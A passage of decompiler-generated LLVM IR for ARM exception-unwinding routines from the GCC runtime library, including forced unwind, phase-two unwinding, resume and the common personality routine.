dec_label_pc_1a290:                               ; preds = %dec_label_pc_1a210, %dec_label_pc_1a288
  br label %dec_label_pc_1a1c8

; uselistorder directives
  uselistorder i32 %v11_1a188, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 8, 7, 0, 1, 6, 5, 10, 9, 4, 3 }
  uselistorder i32* @r3, { 121, 122, 43, 44, 32, 123, 124, 35, 125, 126, 3, 127, 128, 129, 4, 130, 131, 132, 5, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 0, 151, 152, 153, 154, 33, 34, 36, 37, 38, 39, 40, 41, 42, 85, 65, 66, 67, 155, 10, 156, 157, 170, 171, 172, 160, 161, 162, 163, 164, 1, 165, 7, 46, 47, 158, 159, 59, 60, 81, 86, 87, 48, 88, 89, 90, 91, 93, 92, 12, 13, 14, 176, 173, 174, 175, 2, 177, 178, 179, 45, 68, 49, 50, 51, 52, 53, 54, 166, 167, 168, 169, 94, 95, 96, 97, 98, 99, 100, 69, 101, 11, 102, 103, 9, 104, 105, 106, 107, 108, 109, 110, 27, 20, 26, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 28, 29, 30, 31, 82, 83, 84, 111, 55, 56, 58, 57, 61, 62, 63, 64, 70, 8, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 112, 113, 114, 115, 116, 117, 6, 118, 119, 120 }
  uselistorder i32 10, { 4, 5, 37, 38, 39, 9, 46, 45, 89, 0, 42, 43, 81, 47, 82, 1, 12, 41, 72, 13, 35, 36, 30, 7, 73, 31, 14, 3, 32, 74, 15, 75, 16, 76, 17, 77, 18, 78, 19, 79, 80, 40, 20, 21, 22, 23, 24, 44, 10, 48, 49, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 25, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 8, 71, 26, 83, 6, 84, 85, 28, 86, 33, 34, 11, 87, 27, 88, 29 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1a290, { 1, 0 }
  uselistorder label %dec_label_pc_1a234, { 1, 0 }
  uselistorder label %dec_label_pc_1a230, { 1, 0 }
  uselistorder label %dec_label_pc_1a1e0, { 1, 0 }
  uselistorder label %dec_label_pc_1a1cc, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_1a2a4 = add i32 %ucbp, 12
  %v3_1a2a4 = inttoptr i32 %v2_1a2a4 to i32*
  store i32 %stop_fn, i32* %v3_1a2a4, align 4
  %v3_1a2a8 = add i32 %ucbp, 24
  %v4_1a2a8 = inttoptr i32 %v3_1a2a8 to i32*
  store i32 %tmp, i32* %v4_1a2a8, align 4
  %v1_1a2ac = add i32 %entry_vrs, 60
  %v2_1a2ac = inttoptr i32 %v1_1a2ac to i32*
  %v3_1a2ac = load i32, i32* %v2_1a2ac, align 4
  %v2_1a2b4 = add i32 %entry_vrs, 64
  %v3_1a2b4 = inttoptr i32 %v2_1a2b4 to i32*
  store i32 %v3_1a2ac, i32* %v3_1a2b4, align 4
  %v3_1a2bc = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1a2bc

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_1a2d46 = add i32 %vrs, 64
  %v2_1a2d47 = inttoptr i32 %v1_1a2d46 to i32*
  %v3_1a2d48 = load i32, i32* %v2_1a2d47, align 4
  %v2_1a2d89 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_1a2d48)
  store i32 %v2_1a2d89, i32* %r0.global-to-local, align 4
  %v2_1a2dc11 = icmp eq i32 %v2_1a2d89, 0
  br i1 %v2_1a2dc11, label %dec_label_pc_1a2e4, label %dec_label_pc_1a314

dec_label_pc_1a2e4:                               ; preds = %entry, %dec_label_pc_1a2e4.dec_label_pc_1a2d0_crit_edge
  %v0_1a2e4 = load i32, i32* @r5, align 4
  %v1_1a2e4 = add i32 %v0_1a2e4, 64
  %v2_1a2e4 = inttoptr i32 %v1_1a2e4 to i32*
  %v3_1a2e4 = load i32, i32* %v2_1a2e4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1a2ec = load i32, i32* @r4, align 4
  %v2_1a2ec = add i32 %v1_1a2ec, 20
  %v3_1a2ec = inttoptr i32 %v2_1a2ec to i32*
  store i32 %v3_1a2e4, i32* %v3_1a2ec, align 4
  %v0_1a2f0 = load i32, i32* @r4, align 4
  %v1_1a2f8 = add i32 %v0_1a2f0, 16
  %v2_1a2f8 = inttoptr i32 %v1_1a2f8 to i32*
  %v3_1a2f8 = load i32, i32* %v2_1a2f8, align 4
  call void @__pseudo_branch(i32 %v3_1a2f8)
  %v0_1a304 = load i32, i32* %r0.global-to-local, align 4
  %v7_1a304 = icmp eq i32 %v0_1a304, 8
  br i1 %v7_1a304, label %dec_label_pc_1a2e4.dec_label_pc_1a2d0_crit_edge, label %dec_label_pc_1a30c

dec_label_pc_1a2e4.dec_label_pc_1a2d0_crit_edge:  ; preds = %dec_label_pc_1a2e4
  %v0_1a2d0.pre = load i32, i32* @r4, align 4
  %v0_1a2d4.pre = load i32, i32* @r5, align 4
  store i32 %v0_1a2d0.pre, i32* %r0.global-to-local, align 4
  %v1_1a2d4 = add i32 %v0_1a2d4.pre, 64
  %v2_1a2d4 = inttoptr i32 %v1_1a2d4 to i32*
  %v3_1a2d4 = load i32, i32* %v2_1a2d4, align 4
  %v2_1a2d8 = call i32 @get_eit_entry(i32 %v0_1a2d0.pre, i32 %v3_1a2d4)
  store i32 %v2_1a2d8, i32* %r0.global-to-local, align 4
  %v2_1a2dc = icmp eq i32 %v2_1a2d8, 0
  br i1 %v2_1a2dc, label %dec_label_pc_1a2e4, label %dec_label_pc_1a314

dec_label_pc_1a30c:                               ; preds = %dec_label_pc_1a2e4
  %v7_1a30c = icmp eq i32 %v0_1a304, 7
  br i1 %v7_1a30c, label %dec_label_pc_1a318, label %dec_label_pc_1a314

dec_label_pc_1a314:                               ; preds = %entry, %dec_label_pc_1a2e4.dec_label_pc_1a2d0_crit_edge, %dec_label_pc_1a30c
  %v0_1a314 = call i32 @abort()
  store i32 %v0_1a314, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a318

dec_label_pc_1a318:                               ; preds = %dec_label_pc_1a30c, %dec_label_pc_1a314
  %v0_1a318 = load i32, i32* @r5, align 4
  %v1_1a318 = add i32 %v0_1a318, 4
  store i32 %v1_1a318, i32* %r0.global-to-local, align 4
  %v1_1a31c = inttoptr i32 %v1_1a318 to i32*
  %v2_1a31c = call i32 @__restore_core_regs(i32* %v1_1a31c)
  store i32 %v2_1a31c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_1a318, { 1, 0 }
  uselistorder label %dec_label_pc_1a314, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a2e4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_1a320 = add i32 %ucbp, 20
  %v2_1a320 = inttoptr i32 %v1_1a320 to i32*
  %v3_1a320 = load i32, i32* %v2_1a320, align 4
  %v1_1a328 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a328 = add i32 %v1_1a328, 64
  %v3_1a328 = inttoptr i32 %v2_1a328 to i32*
  store i32 %v3_1a320, i32* %v3_1a328, align 4
  %v1_1a32c = add i32 %ucbp, 12
  %v2_1a32c = inttoptr i32 %v1_1a32c to i32*
  %v3_1a32c = load i32, i32* %v2_1a32c, align 4
  %v2_1a330 = icmp eq i32 %v3_1a32c, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1a33c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1a33c, i32* @r5, align 4
  br i1 %v2_1a330, label %dec_label_pc_1a344, label %dec_label_pc_1a380

dec_label_pc_1a344:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_1a350 = add i32 %ucbp, 16
  %v2_1a350 = inttoptr i32 %v1_1a350 to i32*
  %v3_1a350 = load i32, i32* %v2_1a350, align 4
  call void @__pseudo_branch(i32 %v3_1a350)
  br i1 false, label %dec_label_pc_1a378, label %dec_label_pc_1a364

dec_label_pc_1a364:                               ; preds = %dec_label_pc_1a344
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_15134.740 to i32))
  %v0_1a36c = load i32, i32* @r4, align 4
  %v0_1a370 = load i32, i32* @r5, align 4
  store i32 %v0_1a370, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1a36c, i32 %v0_1a370)
  br label %dec_label_pc_1a378

dec_label_pc_1a378:                               ; preds = %dec_label_pc_1a344, %dec_label_pc_1a364
  %v0_1a378 = load i32, i32* @r5, align 4
  %v1_1a378 = add i32 %v0_1a378, 4
  %v1_1a37c = inttoptr i32 %v1_1a378 to i32*
  %v2_1a37c = call i32 @__restore_core_regs(i32* %v1_1a37c)
  %v1_1a384.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a380

dec_label_pc_1a380:                               ; preds = %entry, %dec_label_pc_1a378
  %v1_1a384 = phi i32 [ %v0_1a33c, %entry ], [ %v1_1a384.pre, %dec_label_pc_1a378 ]
  %v3_1a384 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_1a384, i32 1)
  %v0_1a388 = call i32 @abort()
  ret i32 %v0_1a388

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 7, 9, 10, 8, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 47, 48, 49, 50, 51, 53, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 30, 58, 62, 61, 60, 54, 55, 0, 39, 40, 36, 37, 38, 56, 57, 59, 41, 42, 52, 43, 33, 44, 31, 32, 23, 24, 25, 26, 27, 28, 29, 34, 35, 45, 46, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 107, 142, 4, 143, 144, 145, 146, 5, 94, 125, 147, 6, 93, 148, 7, 92, 149, 150, 151, 152, 8, 153, 126, 9, 96, 154, 10, 95, 155, 156, 11, 157, 158, 159, 12, 160, 161, 13, 162, 14, 128, 163, 164, 127, 165, 166, 15, 97, 16, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 18, 99, 19, 177, 178, 179, 20, 98, 180, 21, 17, 181, 182, 22, 183, 184, 185, 23, 186, 187, 188, 189, 190, 24, 25, 129, 26, 27, 28, 29, 141, 100, 191, 192, 101, 193, 131, 194, 195, 31, 196, 197, 32, 102, 199, 30, 200, 198, 201, 130, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 104, 47, 48, 49, 50, 51, 112, 111, 52, 202, 203, 134, 204, 205, 55, 206, 56, 57, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 53, 54, 217, 218, 219, 91, 105, 133, 132, 68, 69, 70, 220, 71, 72, 113, 114, 120, 115, 121, 109, 119, 221, 110, 124, 222, 58, 223, 59, 60, 61, 224, 135, 136, 62, 63, 225, 137, 138, 64, 65, 226, 139, 140, 66, 67, 108, 227, 228, 122, 229, 73, 116, 74, 75, 76, 106, 77, 78, 79, 80, 81, 231, 232, 233, 234, 117, 235, 236, 237, 238, 239, 240, 241, 86, 87, 242, 88, 89, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 85, 258, 259, 260, 261, 262, 263, 84, 264, 103, 118, 123, 90, 265, 82, 83, 230, 266 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_1a380, { 1, 0 }
  uselistorder label %dec_label_pc_1a378, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a38c = load i32, i32* @r4, align 4
  store i32 %v3_1a38c, i32* %stack_var_-16, align 4
  %v6_1a38c = load i32, i32* @r5, align 4
  %v9_1a38c = load i32, i32* @r6, align 4
  %v12_1a38c = load i32, i32* @lr, align 4
  %v1_1a390 = add i32 %entry_vrs, 60
  %v2_1a390 = inttoptr i32 %v1_1a390 to i32*
  %v3_1a390 = load i32, i32* %v2_1a390, align 4
  %v2_1a394 = add i32 %entry_vrs, 64
  %v3_1a394 = inttoptr i32 %v2_1a394 to i32*
  store i32 %v3_1a390, i32* %v3_1a394, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_1a3c4 = load i32, i32* %v3_1a394, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1a3dc = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_1a3c4)
  %v2_1a3e0 = icmp eq i32 %v2_1a3dc, 0
  br i1 %v2_1a3e0, label %dec_label_pc_1a3e8, label %dec_label_pc_1a41c

dec_label_pc_1a3e8:                               ; preds = %entry
  %v0_1a3e8 = load i32, i32* @r5, align 4
  %v1_1a3f0 = add i32 %v0_1a3e8, 16
  %v2_1a3f0 = inttoptr i32 %v1_1a3f0 to i32*
  %v3_1a3f0 = load i32, i32* %v2_1a3f0, align 4
  call void @__pseudo_branch(i32 %v3_1a3f0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a408 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1a40c = urem i32 %v2_1a408, 2
  %v2_1a40c = icmp eq i32 %v1_1a40c, 0
  br i1 %v2_1a40c, label %dec_label_pc_1a42c, label %dec_label_pc_1a414

dec_label_pc_1a414:                               ; preds = %dec_label_pc_1a3e8, %dec_label_pc_1a42c
  %v0_1a414 = phi i1 [ false, %dec_label_pc_1a3e8 ], [ %phitmp, %dec_label_pc_1a42c ]
  br i1 %v0_1a414, label %dec_label_pc_1a438, label %dec_label_pc_1a41c

dec_label_pc_1a41c:                               ; preds = %entry, %dec_label_pc_1a414
  %v2_1a424 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a424, i32* @r4, align 4
  store i32 %v6_1a38c, i32* @r5, align 4
  store i32 %v9_1a38c, i32* @r6, align 4
  store i32 %v12_1a38c, i32* @lr, align 4
  ret i32 9

dec_label_pc_1a42c:                               ; preds = %dec_label_pc_1a3e8
  %v2_1a42c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_1a42c, i32* @r0, align 4
  %v1_1a430 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_1a42c)
  %v0_1a414.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_1a414.pre, 6
  br label %dec_label_pc_1a414

dec_label_pc_1a438:                               ; preds = %dec_label_pc_1a414
  %v0_1a438 = load i32, i32* @r5, align 4
  %v0_1a43c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_1a438, i32 %v0_1a43c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a41c, { 1, 0 }
  uselistorder label %dec_label_pc_1a414, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_1a444 = add i32 %ucbp, 12
  %v2_1a444 = inttoptr i32 %v1_1a444 to i32*
  %v3_1a444 = load i32, i32* %v2_1a444, align 4
  %v2_1a448 = icmp eq i32 %v3_1a444, 0
  br i1 %v2_1a448, label %dec_label_pc_1a450, label %dec_label_pc_1a454

dec_label_pc_1a450:                               ; preds = %entry
  %v2_1a450 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_1a454

dec_label_pc_1a454:                               ; preds = %entry, %dec_label_pc_1a450
  %v1_1a454 = add i32 %entry_vrs, 60
  %v2_1a454 = inttoptr i32 %v1_1a454 to i32*
  %v3_1a454 = load i32, i32* %v2_1a454, align 4
  %v2_1a45c = add i32 %entry_vrs, 64
  %v3_1a45c = inttoptr i32 %v2_1a45c to i32*
  store i32 %v3_1a454, i32* %v3_1a45c, align 4
  %v3_1a460 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_1a460

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1a454, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_1a4c0

bb:                                               ; preds = %entry
  %v7_1a478 = mul i32 %regclass, 4
  %v8_1a478 = add i32 %v7_1a478, ptrtoint (i32* @global_var_1a480.889 to i32)
  call void @__pseudo_branch(i32 %v8_1a478)
  br label %dec_label_pc_1a4c0

dec_label_pc_1a4c0:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_1a5a8 = load i32, i32* @r4, align 4
  %v6_1a5a8 = load i32, i32* @r5, align 4
  %v2_1a5b8 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_1a5c0 = add i32 %ucbp, 76
  %v2_1a5c0 = inttoptr i32 %v1_1a5c0 to i32*
  %v3_1a5c0 = load i32, i32* %v2_1a5c0, align 4
  %v1_1a5cc = inttoptr i32 %v3_1a5c0 to i32*
  %v2_1a5cc = load i32, i32* %v1_1a5cc, align 4
  store i32 %v2_1a5cc, i32* @lr, align 4
  %v4_1a5cc = add i32 %v3_1a5c0, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_1a5d8 = urem i32 %state, 4
  store i32 %v1_1a5d8, i32* %r2.global-to-local, align 4
  %v1_1a5dc = and i32 %state, 8
  store i32 %v1_1a5dc, i32* %r0.global-to-local, align 4
  %v4_1a5ec = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1a5cc, i32* %v4_1a5ec, align 8
  br i1 %v2_1a5b8, label %dec_label_pc_1a5fc, label %dec_label_pc_1a8d8

dec_label_pc_1a5fc:                               ; preds = %entry
  %v3_1a5fc = mul i32 %v2_1a5cc, 256
  store i32 %v3_1a5fc, i32* %v4_1a5ec, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a614

dec_label_pc_1a614:                               ; preds = %dec_label_pc_1a8d8, %dec_label_pc_1a5fc
  %v0_1a638647090 = phi i32 [ %v2_1a8f0, %dec_label_pc_1a8d8 ], [ %v4_1a5cc, %dec_label_pc_1a5fc ]
  store i32 %v1_1a5d8, i32* %r2.global-to-local, align 4
  %v1_1a618 = add i32 %ucbp, 80
  %v2_1a618 = inttoptr i32 %v1_1a618 to i32*
  %v3_1a618 = load i32, i32* %v2_1a618, align 4
  %v7_1a61c = icmp eq i32 %v1_1a5d8, 2
  br i1 %v7_1a61c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_1a614
  %v2_1a620 = add i32 %ucbp, 56
  %v3_1a620 = inttoptr i32 %v2_1a620 to i32*
  %v4_1a620 = load i32, i32* %v3_1a620, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1a614, %bb
  %v0_1a6386470 = phi i32 [ %v0_1a638647090, %dec_label_pc_1a614 ], [ %v4_1a620, %bb ]
  %v1_1a624 = urem i32 %v3_1a618, 2
  %v2_1a624 = icmp eq i32 %v1_1a624, 0
  br i1 %v2_1a624, label %dec_label_pc_1a638.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_1a6f8

dec_label_pc_1a638.preheader:                     ; preds = %bb148
  %v1_1a6386571 = inttoptr i32 %v0_1a6386470 to i32*
  %v2_1a6386672 = load i32, i32* %v1_1a6386571, align 4
  %v2_1a63c6874 = icmp eq i32 %v2_1a6386672, 0
  br i1 %v2_1a63c6874, label %dec_label_pc_1a6f8, label %dec_label_pc_1a644.preheader.lr.ph.lr.ph

dec_label_pc_1a644.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_1a638.preheader
  %v7_1a648 = icmp eq i32 %id, 2
  %v2_1a6d4 = icmp eq i32 %v1_1a5d8, 0
  %v2_1a8a0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1a7bc = icmp eq i32 %v1_1a5dc, 0
  br label %dec_label_pc_1a644.preheader.lr.ph

dec_label_pc_1a644.preheader.lr.ph:               ; preds = %dec_label_pc_1a644.preheader.lr.ph.lr.ph, %dec_label_pc_1a90c
  %v1_1a65496 = phi i32 [ %v2_1a6386672, %dec_label_pc_1a644.preheader.lr.ph.lr.ph ], [ %v2_1a63866, %dec_label_pc_1a90c ]
  %v1_1a65093 = phi i32 [ %v0_1a6386470, %dec_label_pc_1a644.preheader.lr.ph.lr.ph ], [ %v2_1a910, %dec_label_pc_1a90c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_1a644.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_1a90c ]
  br label %dec_label_pc_1a644.preheader

dec_label_pc_1a644.preheader:                     ; preds = %dec_label_pc_1a644.preheader.lr.ph, %dec_label_pc_1a8d0
  %v1_1a65495 = phi i32 [ %v1_1a65496, %dec_label_pc_1a644.preheader.lr.ph ], [ %v2_1a638, %dec_label_pc_1a8d0 ]
  %v1_1a65092 = phi i32 [ %v1_1a65093, %dec_label_pc_1a644.preheader.lr.ph ], [ %v1_1a8d0, %dec_label_pc_1a8d0 ]
  br label %dec_label_pc_1a644

dec_label_pc_1a644:                               ; preds = %dec_label_pc_1a644.preheader, %dec_label_pc_1a6e8
  %v1_1a654 = phi i32 [ %v1_1a65495, %dec_label_pc_1a644.preheader ], [ %v2_1a6ec, %dec_label_pc_1a6e8 ]
  %v1_1a668 = phi i32 [ %v1_1a65092, %dec_label_pc_1a644.preheader ], [ %v1_1a6e8, %dec_label_pc_1a6e8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_1a648, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_1a644
  %v2_1a64c = add i32 %v1_1a668, 4
  %v3_1a64c = inttoptr i32 %v2_1a64c to i32*
  %v4_1a64c = load i32, i32* %v3_1a64c, align 4
  store i32 %v4_1a64c, i32* @r5, align 4
  store i32 %v1_1a654, i32* @r6, align 4
  %v0_1a658109 = load i32, i32* @r8, align 4
  %v1_1a658110 = add i32 %v0_1a658109, 72
  %v2_1a658111 = inttoptr i32 %v1_1a658110 to i32*
  %v3_1a658112 = load i32, i32* %v2_1a658111, align 4
  store i32 %v3_1a658112, i32* @lr, align 4
  %v2_1a664 = add i32 %v1_1a668, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_1a644
  %v2_1a650 = add i32 %v1_1a668, 2
  %v3_1a650 = inttoptr i32 %v2_1a650 to i16*
  %v4_1a650 = load i16, i16* %v3_1a650, align 2
  %v5_1a650 = zext i16 %v4_1a650 to i32
  store i32 %v5_1a650, i32* @r5, align 4
  %v0_1a658 = load i32, i32* @r8, align 4
  %v1_1a658 = add i32 %v0_1a658, 72
  %v2_1a658 = inttoptr i32 %v1_1a658 to i32*
  %v3_1a658 = load i32, i32* %v2_1a658, align 4
  store i32 %v3_1a658, i32* @lr, align 4
  %v2_1a660 = inttoptr i32 %v1_1a668 to i16*
  %v3_1a660 = load i16, i16* %v2_1a660, align 2
  %v4_1a660 = zext i16 %v3_1a660 to i32
  store i32 %v4_1a660, i32* @r6, align 4
  %v2_1a668 = add i32 %v1_1a668, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_1a668, %.thread16 ], [ %v2_1a664, %bb151 ]
  %v3_1a658115 = phi i32 [ %v3_1a658, %.thread16 ], [ %v3_1a658112, %bb151 ]
  %v0_1a670113 = phi i32 [ %v5_1a650, %.thread16 ], [ %v4_1a64c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_1a670 = and i32 %v0_1a670113, -2
  %v2_1a674 = add i32 %v1_1a670, %v3_1a658115
  store i32 %v2_1a674, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a684 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a684, i32* %r0.global-to-local, align 4
  %v5_1a690 = call i32 @_Unwind_VRS_Get(i32 %v0_1a684, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a690, i32* %r0.global-to-local, align 4
  %v3_1a694 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1a694, i32* %r2.global-to-local, align 4
  %v0_1a698 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_1a698, %v3_1a694
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_1a6a4

._crit_edge:                                      ; preds = %bb152
  %v0_1a6bc.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_1a6a4:                               ; preds = %bb152
  %v0_1a6a4 = load i32, i32* @r6, align 4
  %v1_1a6a4 = and i32 %v0_1a6a4, -2
  %v2_1a6a8 = add i32 %v1_1a6a4, %v0_1a698
  %v3_1a6ac = icmp ult i32 %v3_1a694, %v2_1a6a8
  br i1 %v3_1a6ac, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_1a6a4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_1a6a4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1a6bc = phi i32 [ %v0_1a6bc.pre, %._crit_edge ], [ %v0_1a6a4, %bb153 ], [ %v0_1a6a4, %.thread20 ]
  %v0_1a864 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_1a6b8 = load i32, i32* @r5, align 4
  %v1_1a6bc = urem i32 %v0_1a6bc, 2
  %v1_1a6b8 = mul i32 %v0_1a6b8, 2
  %v3_1a6c0 = and i32 %v1_1a6b8, 2
  %v4_1a6c0 = or i32 %v3_1a6c0, %v1_1a6bc
  store i32 %v4_1a6c0, i32* %r2.global-to-local, align 4
  %v7_1a6c4 = icmp eq i32 %v4_1a6c0, 1
  br i1 %v7_1a6c4, label %dec_label_pc_1a858, label %dec_label_pc_1a6cc

dec_label_pc_1a6cc:                               ; preds = %bb154
  %v2_1a6c4 = icmp eq i32 %v4_1a6c0, 0
  br i1 %v2_1a6c4, label %dec_label_pc_1a6d0, label %dec_label_pc_1a780

dec_label_pc_1a6d0:                               ; preds = %dec_label_pc_1a6cc
  store i32 %v1_1a5d8, i32* %r2.global-to-local, align 4
  br i1 %v2_1a6d4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_1a6d0
  %v0_1a6e8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a6e8

bb155:                                            ; preds = %dec_label_pc_1a6d0
  %v2_1a6e0 = icmp eq i32 %v0_1a864, 0
  %v0_1a6e8 = load i32, i32* @r7, align 4
  br i1 %v2_1a6e0, label %dec_label_pc_1a6e8, label %dec_label_pc_1aa60

dec_label_pc_1a6e8:                               ; preds = %.thread, %bb155
  %v0_1a6e8120 = phi i32 [ %v0_1a6e8119, %.thread ], [ %v0_1a6e8, %bb155 ]
  %v1_1a6e8 = add i32 %v0_1a6e8120, 4
  %v1_1a6ec = inttoptr i32 %v1_1a6e8 to i32*
  %v2_1a6ec = load i32, i32* %v1_1a6ec, align 4
  %v2_1a6f0 = icmp eq i32 %v2_1a6ec, 0
  br i1 %v2_1a6f0, label %dec_label_pc_1a6f8, label %dec_label_pc_1a644

